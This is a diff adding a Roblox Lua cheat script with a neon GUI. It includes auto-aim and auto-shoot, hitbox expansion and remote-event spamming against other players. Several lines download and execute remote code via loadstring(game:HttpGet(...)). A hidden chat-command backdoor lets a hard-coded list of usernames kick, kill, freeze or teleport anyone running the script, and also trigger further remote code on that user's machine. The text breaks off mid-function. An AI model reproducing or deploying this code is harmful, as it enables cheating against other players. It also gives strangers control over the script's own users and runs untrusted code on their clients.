@@ -1,0 +1,1445 @@
+-- [[ Script Word [TH] - Neon Edition (Update VIP List) ]]
+
+local Player = game.Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local MyName = Player.Name
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- [Start Logic] เธ”เธตเน€เธฅเธขเน 5 เธงเธด + เน€เธเธฅเธ + Welcome + Credit
+local function ShowWelcome()
+    local Sound = Instance.new("Sound", game.Workspace)
+    Sound.SoundId = "rbxassetid://136735742758927"
+    Sound.Volume = 2
+    Sound:Play()
+    
+    task.wait(5)
+    
+    local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
+    
+    local function CreateNotify(text, pos)
+        local label = Instance.new("TextLabel", WelcomeGui)
+        label.Size = UDim2.new(0, 250, 0, 40)
+        label.Position = pos
+        label.BackgroundTransparency = 1
+        label.Text = text
+        label.TextColor3 = Color3.new(1, 1, 1)
+        label.Font = Enum.Font.FredokaOne
+        label.TextSize = 14
+        label.TextTransparency = 1
+        local WS = Instance.new("UIStroke", label)
+        WS.Thickness = 2; WS.Color = Color3.fromRGB(255, 0, 0); WS.Transparency = 1
+        return label, WS
+    end
+
+    local L1, S1 = CreateNotify("Welcome to Script Word", UDim2.new(0.5, -125, 0.1, 0))
+    TweenService:Create(L1, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
+    TweenService:Create(S1, TweenInfo.new(0.8), {Transparency = 0}):Play()
+    task.wait(2.5)
+    
+    local L2, S2 = CreateNotify("By Owner Human", UDim2.new(0.5, -125, 0.15, 0))
+    TweenService:Create(L2, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
+    TweenService:Create(S2, TweenInfo.new(0.8), {Transparency = 0}):Play()
+    
+    task.wait(3)
+    
+    TweenService:Create(L1, TweenInfo.new(1), {TextTransparency = 1}):Play()
+    TweenService:Create(S1, TweenInfo.new(1), {Transparency = 1}):Play()
+    TweenService:Create(L2, TweenInfo.new(1), {TextTransparency = 1}):Play()
+    TweenService:Create(S2, TweenInfo.new(1), {Transparency = 1}):Play()
+    
+    task.wait(1)
+    WelcomeGui:Destroy()
+    task.wait(2)
+    Sound:Destroy()
+end
+
+task.spawn(ShowWelcome)
+
+-- [Logics] เธฃเธฒเธขเธเธทเนเธญ VIP (เน€เธเธดเนเธก zx71828 เน€เธฃเธตเธขเธเธฃเนเธญเธข)
+_G.VIP_LIST = _G.VIP_LIST or {
+    ["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true,
+    ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true,
+    ["zx71828"] = true
+}
+local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
+local GIFTED_LIST = {} 
+
+if not Player:FindFirstChild("ScriptWord_Active") then
+    Instance.new("StringValue", Player).Name = "ScriptWord_Active"
+end
+
+local function MakeDraggable(frame)
+    local dragging, dragInput, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true; dragStart = input.Position; startPos = frame.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+        end
+    end)
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function ApplyNeonEffect(frame, color)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Thickness = 2.5; stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; stroke.Color = color
+    task.spawn(function()
+        while true do
+            TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.2, Thickness = 3.5}):Play()
+            task.wait(1)
+            TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7, Thickness = 2}):Play()
+            task.wait(1)
+        end
+    end)
+end
+
+local function CustomKick()
+    local Sound = Instance.new("Sound", game.Workspace)
+    local sId = KickSoundInp.Text
+    if not sId:find("rbxassetid://") then sId = "rbxassetid://"..sId end
+    Sound.SoundId = sId; Sound.Volume = 5; Sound:Play()
+    local ScreenGuiK = Instance.new("ScreenGui", game.CoreGui)
+    ScreenGuiK.IgnoreGuiInset = true
+    local TextLabel = Instance.new("TextLabel", ScreenGuiK)
+    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0); TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.Text = KickTextInp.Text; TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    TextLabel.TextScaled = true; TextLabel.ZIndex = 999999
+    task.wait(3.5)
+    Player:Kick("\n\n[ Humanx1 System ]\n"..KickTextInp.Text.."\n")
+    ScreenGuiK:Destroy()
+end
+
+-- [[ UI SYSTEM ]]
+local MainGui = Instance.new("ScreenGui", game.CoreGui)
+MainGui.Name = "ScriptWordTH_Extreme"
+
+local AdminPanel = Instance.new("Frame", MainGui)
+AdminPanel.Size = UDim2.new(0, 260, 0, 320); AdminPanel.Position = UDim2.new(0.5, -130, 0.5, -160)
+AdminPanel.BackgroundColor3 = Color3.fromRGB(15, 5, 5); AdminPanel.BackgroundTransparency = 0.1; AdminPanel.Visible = false
+ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel)
+
+local AdminTitle = Instance.new("TextLabel", AdminPanel)
+AdminTitle.Size = UDim2.new(1, 0, 0, 35); AdminTitle.Text = "Commands Script Word [TH]"
+AdminTitle.TextColor3 = Color3.fromRGB(255, 50, 50); AdminTitle.BackgroundTransparency = 1
+AdminTitle.Font = Enum.Font.FredokaOne; AdminTitle.TextSize = 14
+
+local HelpList = Instance.new("TextLabel", AdminPanel)
+HelpList.Size = UDim2.new(0.9, 0, 0, 60); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
+HelpList.BackgroundTransparency = 1; HelpList.TextColor3 = Color3.fromRGB(200, 200, 200)
+HelpList.Text = "!kill [name] | !kick [name] | !tp [name]\n!freeze [name] | !unfreeze [name]\n!givevip [name] | !killall | !kickall"
+HelpList.Font = Enum.Font.SourceSansBold; HelpList.TextSize = 12
+
+KickTextInp = Instance.new("TextBox", AdminPanel)
+KickTextInp.Size = UDim2.new(0.9, 0, 0, 32); KickTextInp.Position = UDim2.new(0.05, 0, 0.35, 0)
+KickTextInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickTextInp.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", KickTextInp); KickTextInp.Text = "เนเธ”เธเธเธนเน€เธ•เธฐเนเธเนเธญเนเธเธงเธฒเธข"
+
+KickSoundInp = Instance.new("TextBox", AdminPanel)
+KickSoundInp.Size = UDim2.new(0.9, 0, 0, 32); KickSoundInp.Position = UDim2.new(0.05, 0, 0.50, 0)
+KickSoundInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickSoundInp.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", KickSoundInp); KickSoundInp.Text = "rbxassetid://137337370812885"
+
+local CmdBar = Instance.new("TextBox", AdminPanel)
+CmdBar.Size = UDim2.new(0.9, 0, 0, 40); CmdBar.Position = UDim2.new(0.05, 0, 0.82, 0)
+CmdBar.BackgroundColor3 = Color3.fromRGB(10, 30, 10); CmdBar.TextColor3 = Color3.fromRGB(0, 255, 120)
+CmdBar.PlaceholderText = "> ENTER COMMAND..."; Instance.new("UICorner", CmdBar)
+
+local Board = Instance.new("Frame", MainGui)
+Board.Size = UDim2.new(0, 210, 0, 260); Board.Position = UDim2.new(0.85, 0, 0.3, 0)
+Board.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Board.BackgroundTransparency = 0.15
+ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board)
+
+local BoardTitle = Instance.new("TextLabel", Board)
+BoardTitle.Size = UDim2.new(1, 0, 0, 40); BoardTitle.Text = "Script Word [TH]"
+BoardTitle.TextColor3 = Color3.fromRGB(255, 215, 0); BoardTitle.BackgroundTransparency = 1
+BoardTitle.Font = Enum.Font.FredokaOne; BoardTitle.TextSize = 15
+
+local Scroll = Instance.new("ScrollingFrame", Board)
+Scroll.Size = UDim2.new(1, -10, 1, -55); Scroll.Position = UDim2.new(0, 5, 0, 45)
+Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 2
+
+local function CreateBtn(txt, pos, color)
+    local b = Instance.new("TextButton", MainGui)
+    b.Size = UDim2.new(0, 48, 0, 48); b.Position = pos; b.Text = txt
+    b.BackgroundColor3 = color; b.TextColor3 = Color3.new(1,1,1); b.Font = Enum.Font.FredokaOne
+    b.TextSize = 20; Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
+    local bs = Instance.new("UIStroke", b); bs.Thickness = 2; bs.Color = Color3.new(1,1,1)
+    b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 55, 0, 55), BackgroundColor3 = Color3.new(1,1,1), TextColor3 = color}):Play() end)
+    b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 48, 0, 48), BackgroundColor3 = color, TextColor3 = Color3.new(1,1,1)}):Play() end)
+    MakeDraggable(b); return b
+end
+
+local MinBoardBtn = CreateBtn("๐“", UDim2.new(0.85, -50, 0.3, 0), Color3.fromRGB(0, 120, 255))
+MinBoardBtn.MouseButton1Click:Connect(function() Board.Visible = not Board.Visible end)
+local MinAdminBtn = CreateBtn("๐ก", UDim2.new(0.5, -180, 0.5, -125), Color3.fromRGB(255, 0, 0))
+MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
+MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
+
+local function UpdateBoard()
+    for _, v in pairs(Scroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
+    Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
+    for _, p in pairs(game.Players:GetPlayers()) do
+        local isRunning = p:FindFirstChild("ScriptWord_Active")
+        if isRunning or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] then
+            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100)
+            if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
+            elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255,215,0)
+            elseif GIFTED_LIST[p.Name] then tag, color = "[GFT]", Color3.fromRGB(0,255,255) end
+            local l = Instance.new("TextLabel", Scroll)
+            l.Size = UDim2.new(1, -5, 0, 22); l.Text = " " .. tag .. " " .. p.Name
+            l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.FredokaOne; l.TextSize = 12
+            l.TextXAlignment = Enum.TextXAlignment.Left
+        end
+    end
+end
+
+task.spawn(function() while task.wait(3) do UpdateBoard() end end)
+
+local function ListenChat(speaker, msg)
+    local args = msg:split(" ")
+    local cmd = args[1]:lower()
+    local function findTarget(name)
+        for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
+        return nil
+    end
+    local target = args[2] and findTarget(args[2])
+    if _G.VIP_LIST[speaker.Name] or ADMIN_COMMANDER[speaker.Name] then
+        if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+        elseif cmd == "!kickall" then CustomKick() end
+        local canExecute = (ADMIN_COMMANDER[speaker.Name] and target == Player) or (speaker == Player and (not target or target == Player)) or (target == Player and GIFTED_LIST[target.Name] == speaker.Name)
+        if canExecute then
+            if cmd == "!kick" then CustomKick()
+            elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+            elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+            elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
+            elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
+        end
+        if cmd == "!givevip" and target == Player then
+            GIFTED_LIST[Player.Name] = speaker.Name; UpdateBoard()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
+        end
+    end
+    if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then AdminPanel.Visible = true; MinAdminBtn.Visible = true end
+end
+
+CmdBar.FocusLost:Connect(function(e) if e then ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
+game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
+for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
+game.Players.PlayerRemoving:Connect(UpdateBoard)
+
+if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
+    if ADMIN_COMMANDER[MyName] then AdminPanel.Visible = true end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
+end
+UpdateBoard()
+---------------------------------------------------------
+-- [ UTILS & SERVICES ]
+---------------------------------------------------------
+function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback
+end
+    
+cloneref = missing("function", cloneref, function(...) return ... end)
+    
+local Services = setmetatable({}, {
+  __index = function(_, name)
+      return cloneref(game:GetService(name))
+  end
+})
+    
+local Players = Services.Players
+local RunService = Services.RunService
+local StarterGui = Services.StarterGui
+
+-- Control variables for Quick Holster
+local isForcingHolster = false
+
+-- Ultra-Fast Holster System (Runs every frame)
+task.spawn(function()
+    RunService.Stepped:Connect(function()
+        if isForcingHolster then
+            local char = plr.Character
+            if char then
+                for _, tool in ipairs(char:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        tool.Parent = plr.Backpack
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+-- Custom Notification Function
+local function sendScriptMsg(title, text)
+    StarterGui:SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = 3
+    })
+end
+
+---------------------------------------------------------
+-- [ NEW: AUTO SAVE & RETRIEVE SYSTEM ]
+---------------------------------------------------------
+-- Save items to safe on death and retrieve on respawn
+local function handleInventorySync(char)
+    local humanoid = char:WaitForChild("Humanoid")
+    local toolStorage = game:GetService("ReplicatedStorage"):WaitForChild("ToolStorage"):WaitForChild("ToolsStorage")
+    
+    -- On Death
+    humanoid.Died:Connect(function()
+        sendScriptMsg("System", "Saving items to safe...")
+        toolStorage:FireServer("Save", "Gun")
+        toolStorage:FireServer("Save", "Phone")
+        toolStorage:FireServer("Save", "Boombox")
+    end)
+    
+    -- On Respawn (Retrieve)
+    task.wait(1) 
+    sendScriptMsg("System", "Retrieving all items...")
+    toolStorage:FireServer("Get", "Gun")
+    toolStorage:FireServer("Get", "Phone")
+    toolStorage:FireServer("Get", "Boombox")
+end
+
+plr.CharacterAdded:Connect(handleInventorySync)
+if plr.Character then task.spawn(handleInventorySync, plr.Character) end
+    
+---------------------------------------------------------
+-- [ NEW: TYPEWRITER EFFECT ON RUN ]
+---------------------------------------------------------
+task.spawn(function()
+    local displayTitle = "Script Word [" .. plr.Name .. "]" 
+    local remote = game:GetService("ReplicatedStorage"):WaitForChild("NameTagRemoteEvent")
+    local currentText = ""
+    for i = 1, #displayTitle do
+        currentText = string.sub(displayTitle, 1, i)
+        remote:FireServer(currentText, Color3.fromRGB(255, 255, 255), 38)
+        task.wait(0.1)
+    end
+    task.wait(5)
+    remote:FireServer(plr.Name, Color3.fromRGB(255, 255, 255), 38)
+end)
+
+if game.PlaceId == 4503309821 then
+    local function onCharacterAdded(p)
+        StarterGui:SetCore("SendNotification",{
+          Title="Credit : Human",
+          Text="Anti Crash Active",
+          Duration=10
+        })
+        local strgui = game:WaitForChild("StarterGui")
+        local plrgui = p:WaitForChild("PlayerGui")
+      
+        local strAncm = strgui:WaitForChild("Announcement")
+        local plrAncm = plrgui:WaitForChild("Announcement")
+        local AncmFrame = plrAncm:WaitForChild("Frame")
+        plrAncm:Destroy()
+        plrgui.ChildAdded:Connect(function(gui)
+            if gui.Name == "Announcement" then
+                gui:Destroy()
+            end
+        end)
+    end  
+    
+    plr.CharacterAdded:Connect(onCharacterAdded)
+    
+    if plr or plr.Character then
+        onCharacterAdded(plr)
+    end
+end
+
+game:GetService("ReplicatedStorage").BloxbizRemotes.CatalogOnApplyToRealHumanoid:FireServer({["BodyColor"] = Color3.new(0.780392, 0.67451, 0.470588)})
+
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("Multi-Hub System (ULTIMATE)", "Default")
+
+---------------------------------------------------------
+-- [ SETTINGS & VARIABLES ]
+---------------------------------------------------------
+local autoSwapEnabled = false
+local shootForwardEnabled = false 
+local lockOnEnabled = true
+local autoClaimEnabled = false 
+local tpAboveHeadEnabled = false
+local orbitSpinEnabled = false 
+local spinLockEnabled = false
+local autoBuyLoop = false
+local autoBuyPhoneLoop = false
+local autoBuyBoomboxLoop = false
+local autoSellEnabled = false 
+local targetSearchName = ""
+local hitboxEnabled = false
+local hitboxSize = 15 
+local rainbowNameEnabled = false
+local rainbowBoomboxEnabled = false
+local rainbowCharacterEnabled = false
+local customNameTag = "Script Word By " .. plr.Name 
+local silentAimKill = false 
+
+-- NEW: Ultimate Orbit Variables
+local gunOrbitEnabled = false
+local orbitAngle = 0
+
+-- [[ NEW: BOSS HUNTER SPIN (NON-SHOOTING) ]]
+local bossHunterSpin = false
+local bhAngle = 0
+
+-- New Variables
+local fastRemotes = false
+local reachEnabled = false
+local autoArmor = false
+local noClipEnabled = false
+local flightEnabled = false
+local flySpeed = 50
+
+local stopAllFirefly = false
+local fireflyCount = 100
+local fireflySpawning = false
+
+-- [[ ANTI-WARP VARIABLES ]]
+local antiWarpEnabled = false
+local lastValidPos = nil
+
+-- [[ NEW: CLICK TO KILL VARIABLES ]]
+local clickKillEnabled = false
+local mouse = plr:GetMouse()
+
+-- [[ SKY SENTRY VARIABLES ]]
+local skySentryEnabled = false
+local skyHeight = 50
+local mapSweeperEnabled = false 
+
+-- [[ NEW: ULTIMATE BOSS HUNTER ]]
+local ultimateBossHunterEnabled = false
+local ubhAngle = 0
+
+---------------------------------------------------------
+-- [ FUNCTION: UTILS ]
+---------------------------------------------------------
+local function getClosestPlayer(range)
+    local closestPlayer = nil
+    local shortestDistance = range
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.Humanoid.Health > 0 then
+            local distance = plr:DistanceFromCharacter(player.Character.HumanoidRootPart.Position)
+            if distance > 0 and distance < shortestDistance then
+                shortestDistance = distance
+                closestPlayer = player
+            end
+        end
+    end
+    return closestPlayer
+end
+
+local function getUltimateTargetPos(target)
+    if not target or not target.Character then return nil end
+    local head = target.Character:FindFirstChild("Head")
+    local root = target.Character:FindFirstChild("HumanoidRootPart")
+    
+    if head and root then
+        local vel = root.Velocity
+        local prediction = head.Position + (vel * 0.185)
+        if vel.Y > 5 then
+            prediction = prediction - Vector3.new(0, 0.5, 0)
+        end
+        return prediction
+    end
+    return nil
+end
+
+local function safeUltraShoot(targetPos)
+    local character = plr.Character
+    if not character then return end
+    local tools = {}
+    for _, item in ipairs(plr.Backpack:GetChildren()) do if item:IsA("Tool") and item.Name ~= "Phone" then table.insert(tools, item) end end
+    for _, item in ipairs(character:GetChildren()) do if item:IsA("Tool") and item.Name ~= "Phone" then table.insert(tools, item) end end
+    for i, tool in ipairs(tools) do
+        local remote = tool:FindFirstChild("shot") or tool:FindFirstChild("RemoteEvent")
+        if remote then
+            task.spawn(function()
+                character.Humanoid:EquipTool(tool)
+                remote:FireServer(targetPos)
+            end)
+            if i % 3 == 0 then task.wait() end 
+        end
+    end
+end
+
+local function spawnFireflies(count)
+    if stopAllFirefly then return end
+    local fireflies = plr.Backpack:FindFirstChild("Fireflies") or plr.Character:FindFirstChild("Fireflies")
+    if not fireflies then return end
+    local remote = fireflies:FindFirstChild("RemoteEvent")
+    if not remote then return end
+    fireflySpawning = true
+    task.spawn(function()
+        for i = 1, count do
+            if stopAllFirefly then break end
+            pcall(function() remote:FireServer() end)
+            if i % 100 == 0 then task.wait() end
+        end
+        fireflySpawning = false
+    end)
+end
+
+-- Check if item count is less than 10
+local function needsMore(itemName)
+    local count = 0
+    for _, v in ipairs(plr.Backpack:GetChildren()) do if v.Name == itemName then count = count + 1 end end
+    if plr.Character then
+        for _, v in ipairs(plr.Character:GetChildren()) do if v.Name == itemName then count = count + 1 end end
+    end
+    return count < 10
+end
+
+---------------------------------------------------------
+-- [ UPDATED: ADMIN & CREATOR COMMANDS ]
+---------------------------------------------------------
+-- Added "TV_BTS1" to the list as requested
+local scriptAdmins = {"ffsww_1007", "A_ASPD", "HACKER_18050", "evils915", "Winwie001", "TV_BTS1"}
+
+local function runAdminCommand(sender, message)
+    local msg = string.lower(message)
+    local parts = string.split(msg, " ")
+    local cmd = parts[1]
+    local targetInput = parts[2]
+    
+    local isAdminSender = false
+    for _, adminName in ipairs(scriptAdmins) do
+        if sender.Name == adminName then isAdminSender = true break end
+    end
+
+    if isAdminSender then
+        if cmd == "!cmd" then
+            sendScriptMsg("Commands List", "!kick, !freeze, !r, !firefly, !fireflystop, !fireflyclear")
+        end
+
+        if targetInput then
+            local targetPlayer = nil
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if string.find(string.lower(p.Name), string.lower(targetInput)) then
+                    targetPlayer = p
+                    break
+                end
+            end
+
+            if targetPlayer then
+                if cmd == "!kick" then
+                    if targetPlayer == plr then
+                        local isMeAdmin = (plr.Name == "ffsww_1007" or plr.Name == "A_ASPD")
+                        if not isMeAdmin then plr:Kick("\n[Admin System]\nYou have been kicked by: " .. sender.Name) end
+                    end
+                elseif cmd == "!freeze" then
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        targetPlayer.Character.HumanoidRootPart.Anchored = true
+                        sendScriptMsg("Admin", "Froze " .. targetPlayer.Name)
+                    end
+                elseif cmd == "!r" then
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                        targetPlayer.Character.Humanoid.Health = 0
+                        sendScriptMsg("Admin", "Reset " .. targetPlayer.Name)
+                    end
+                end
+            end
+        end
+        
+        if cmd == "!firefly" then spawnFireflies(tonumber(parts[2]) or 100)
+        elseif cmd == "!fireflystop" then stopAllFirefly = true task.wait(0.5) stopAllFirefly = false
+        elseif cmd == "!fireflyclear" then
+            for _, obj in pairs(workspace:GetDescendants()) do if string.find(string.lower(obj.Name), "firefly") then obj:Destroy() end end
+        end
+    end
+end
+
+for _, p in ipairs(game.Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end)
+end
+game.Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end)
+end)
+
+plr.Chatted:Connect(function(message)
+    local msg = string.lower(message)
+    local parts = string.split(msg, " ")
+    if parts[1] == "!firefly" then spawnFireflies(tonumber(parts[2]) or 100)
+    elseif parts[1] == "!fireflystop" then stopAllFirefly = true task.wait(0.5) stopAllFirefly = false
+    elseif parts[1] == "!fireflyclear" then
+        for _, obj in pairs(workspace:GetDescendants()) do if string.find(string.lower(obj.Name), "firefly") then obj:Destroy() end end
+    end
+end)
+
+---------------------------------------------------------
+-- [ TAB 1: COMBAT ]
+---------------------------------------------------------
+local mainTab = DrRayLibrary.newTab("Combat", "rbxassetid://10734951151")
+
+-- [[ NEW ADDED: ULTIMATE BOSS HUNTER (REMOTE SHOOT & FOLLOW) ]]
+mainTab.newToggle("Ultimate Boss Hunter (FOLLOW)", "Guns orbit you & AUTO-SHOOT nearby players", false, function(state)
+    ultimateBossHunterEnabled = state
+    task.spawn(function()
+        while ultimateBossHunterEnabled do
+            local dt = RunService.RenderStepped:Wait()
+            local char = plr.Character
+            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
+            
+            local root = char.HumanoidRootPart
+            local target = getClosestPlayer(800) -- รัศมี 800 studs
+            local targetPos = target and getUltimateTargetPos(target)
+
+            local guns = {}
+            for _, item in ipairs(plr.Backpack:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            for _, item in ipairs(char:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            
+            ubhAngle = ubhAngle + (dt * 5) -- ความเร็วการหมุนรอบตัว
+            local radius = 8 -- ระยะห่างปืนลอย
+            
+            for i, gun in ipairs(guns) do
+                local angle = ubhAngle + (i * (math.pi * 2 / #guns))
+                local offset = Vector3.new(math.cos(angle) * radius, 3, math.sin(angle) * radius)
+                local orbitPos = root.Position + offset
+                
+                local handle = gun:FindFirstChild("Handle")
+                if handle then
+                    local bp = handle:FindFirstChild("UBHBP") or Instance.new("BodyPosition", handle)
+                    local bg = handle:FindFirstChild("UBHBG") or Instance.new("BodyGyro", handle)
+                    bp.Name = "UBHBP"
+                    bg.Name = "UBHBG"
+                    bp.MaxForce = Vector3.new(1,1,1) * 10^9 
+                    bp.P = 100000 
+                    bg.MaxTorque = Vector3.new(1,1,1) * 10^9
+                    bg.P = 100000
+                    
+                    bp.Position = orbitPos
+                    
+                    if targetPos then
+                        bg.CFrame = CFrame.new(orbitPos, targetPos) -- หันปืนไปหาเป้าหมาย
+                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
+                        if remote then remote:FireServer(targetPos) end -- ยิง Remote ทันที
+                    else
+                        bg.CFrame = CFrame.new(orbitPos, orbitPos + root.CFrame.LookVector) -- หันตามหน้าตัวละคร
+                    end
+                end
+            end
+        end
+        -- Clean Up
+        if not ultimateBossHunterEnabled then
+            for _, item in ipairs(plr.Backpack:GetDescendants()) do
+                if item.Name == "UBHBP" or item.Name == "UBHBG" then item:Destroy() end
+            end
+            if plr.Character then
+                for _, item in ipairs(plr.Character:GetDescendants()) do
+                    if item.Name == "UBHBP" or item.Name == "UBHBG" then item:Destroy() end
+                end
+            end
+        end
+    end)
+end)
+
+-- [ ADDED: BOSS HUNTER GUN SPIN (NO SHOOT) ]
+mainTab.newToggle("Boss Hunter Spin (Only Visual)", "Spin guns around you (No Shooting)", false, function(state)
+    bossHunterSpin = state
+    task.spawn(function()
+        while bossHunterSpin do
+            local dt = RunService.RenderStepped:Wait()
+            local char = plr.Character
+            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
+            
+            local root = char.HumanoidRootPart
+            local guns = {}
+            for _, item in ipairs(plr.Backpack:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then 
+                    table.insert(guns, item) 
+                end 
+            end
+            for _, item in ipairs(char:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then 
+                    table.insert(guns, item) 
+                end 
+            end
+            
+            bhAngle = bhAngle + (dt * 12) -- Speed
+            local radius = 7 -- Circle Distance
+            
+            for i, gun in ipairs(guns) do
+                local angle = bhAngle + (i * (math.pi * 2 / #guns))
+                local offset = Vector3.new(math.cos(angle) * radius, 3 + math.sin(bhAngle*0.5), math.sin(angle) * radius)
+                local orbitPos = root.Position + offset
+                
+                local handle = gun:FindFirstChild("Handle")
+                if handle then
+                    local bp = handle:FindFirstChild("BHSpinBP") or Instance.new("BodyPosition", handle)
+                    local bg = handle:FindFirstChild("BHSpinBG") or Instance.new("BodyGyro", handle)
+                    
+                    bp.Name = "BHSpinBP"
+                    bg.Name = "BHSpinBG"
+                    
+                    bp.MaxForce = Vector3.new(1,1,1) * 10^9 
+                    bp.P = 150000 
+                    bg.MaxTorque = Vector3.new(1,1,1) * 10^9
+                    bg.P = 150000
+                    
+                    bp.Position = orbitPos
+                    -- Points guns forward to look cool
+                    bg.CFrame = CFrame.new(orbitPos, orbitPos + root.CFrame.LookVector)
+                end
+            end
+        end
+        
+        if not bossHunterSpin then
+            for _, item in ipairs(plr.Backpack:GetDescendants()) do
+                if item.Name == "BHSpinBP" or item.Name == "BHSpinBG" then item:Destroy() end
+            end
+            if plr.Character then
+                for _, item in ipairs(plr.Character:GetDescendants()) do
+                    if item.Name == "BHSpinBP" or item.Name == "BHSpinBG" then item:Destroy() end
+                end
+            end
+        end
+    end)
+end)
+
+mainTab.newToggle("Sky Map Sweeper (GLOBAL)", "Shoot everyone in map from sky", false, function(state)
+    mapSweeperEnabled = state
+    task.spawn(function()
+        while mapSweeperEnabled do
+            local dt = RunService.RenderStepped:Wait()
+            local char = plr.Character
+            if not char then continue end
+            
+            local guns = {}
+            for _, item in ipairs(plr.Backpack:GetChildren()) do 
